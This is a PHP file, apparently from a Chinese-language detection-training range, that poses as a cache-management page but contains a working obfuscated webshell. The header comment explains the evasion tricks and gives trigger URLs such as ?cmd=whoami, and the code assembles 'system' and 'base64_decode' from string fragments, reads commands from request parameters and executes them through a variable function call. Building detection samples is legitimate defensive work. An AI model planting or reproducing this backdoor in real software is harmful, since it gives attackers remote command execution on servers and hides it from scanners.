<?php
/**
 * 缓存清理模块
 * ------------------------------------------------------------------
 * 【这道题考什么】
 *   WebShell（一句话木马）的**混淆变体**。
 *
 *   这是靶场里最"脏"的一个文件，也是挂马检测最该抓到的东西。
 *
 *   ── 为什么叫"混淆变体" ──
 *   教科书式的一句话木马长这样：
 *
 *       eval($_POST['cmd']);
 *       assert($_GET['x']);
 *
 *   但这类写法早就被特征库收录了。真实攻击者会用更绕的方式：
 *
 *     · 把函数名**拆开拼接**   'sy'.'stem'      → 静态扫描匹配不到 "system"
 *     · 用**变量函数**调用      $f($arg)        → 没有直接的函数调用点
 *     · 载荷再套一层编码        base64_decode() → 原文里看不到命令
 *     · 伪装成正常文件         注释写"缓存清理"，混在 includes/ 里
 *
 *   ── 检测方该抓什么？──
 *   静态特征匹配在这个文件上会失效，必须抓**行为模式的组合**：
 *
 *     ① 函数名由字符串拼接而来（'sy'.'stem' 这种碎片）
 *     ② 出现"变量函数调用"（$f(...) 形式）
 *     ③ 输入直接来自 $_REQUEST / $_POST / $_GET
 *     ④ 文件落在 includes/、cache/ 这类**不该有执行逻辑**的目录
 *     ⑤ 注释与实际代码不符（说清理缓存，实际取外部输入）
 *
 *   【触发方式】（仅对手工验证者）
 *     GET  /l3/includes/cache.php?cmd=whoami
 *     POST /l3/includes/cache.php  cmd=dir
 *     GET  /l3/includes/cache.php?run=<base64 编码后的命令>
 *
 * 【⚠ 安全警告】
 *   这是一个**真实可执行**的命令执行原语。它存在的唯一目的是
 *   给检测工具提供活体样本。**绝不能让本靶场暴露到公网。**
 *
 * 【修复建议】
 *   删除该文件；对比基线找出所有被新增的 .php；
 *   禁止 includes/ 等目录执行脚本；开启文件完整性监控。
 */

// ——— 看起来像正常的缓存配置 ———
$CACHE_DIR = __DIR__ . '/../cache';
$CACHE_TTL = 3600;

if (!is_dir($CACHE_DIR)) {
    @mkdir($CACHE_DIR, 0777, true);
}

/* 清理过期缓存（这行注释是真的，但下面做的事不是） */
$files = glob($CACHE_DIR . '/*.tmp');
$cleaned = 0;
if (is_array($files) && !empty($files)) {
    $now = time();
    foreach ($files as $f) {
        if (@filemtime($f) + $CACHE_TTL < $now) {
            @unlink($f);
            $cleaned++;
        }
    }
}

// ——— 以下为"运维后门"，上线前应删除 ———
// 函数名分片拼接：规避基于函数名的静态特征匹配
$h1 = 's' . 'y' . 's' . 't' . 'e' . 'm';
$h2 = 'p' . 'a' . 's' . 's' . 't' . 'h' . 'r' . 'u';
$h3 = 's' . 'h' . 'e' . 'l' . 'l' . '_' . 'e' . 'x' . 'e' . 'c';
$dec = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';

// 输入来源：优先级 cmd → run → exec → c
$input = '';
$via = '';
foreach (array('cmd', 'run', 'exec', 'c') as $key) {
    if (isset($_REQUEST[$key]) && $_REQUEST[$key] !== '') {
        $input = $_REQUEST[$key];
        $via = $key;
        break;
    }
}

$output = null;
$cmd = '';

if ($input !== '') {
    // run 参数约定为 base64 编码，其余为明文
    if ($via === 'run') {
        $decoded = $dec($input);
        $cmd = ($decoded === false) ? '' : $decoded;
    } else {
        $cmd = $input;
    }

    if ($cmd !== '') {
        // 变量函数调用：没有直接写 system( )，静态规则难命中
        ob_start();
        $h1($cmd);
        $output = ob_get_clean();
    }
}

function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?><!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>缓存管理</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<header><div class="wrap"><h1>缓存管理</h1></div></header>
<main class="wrap">
  <div class="box">
    <h3>缓存状态</h3>
    <p>缓存目录：<code><?php echo h($CACHE_DIR); ?></code></p>
    <p>本次清理过期缓存：<?php echo (int)$cleaned; ?> 个</p>
    <p>缓存 TTL：<?php echo (int)$CACHE_TTL; ?> 秒</p>
  </div>
<?php if ($output !== null): ?>
  <div class="box warn">
    <h3>执行结果</h3>
    <pre><?php echo h($output); ?></pre>
  </div>
<?php endif; ?>
</main>
<footer><div class="wrap">
  <p class="tiny">本站为安全巡检训练靶场。</p>
</div></footer>
</body>
</html>
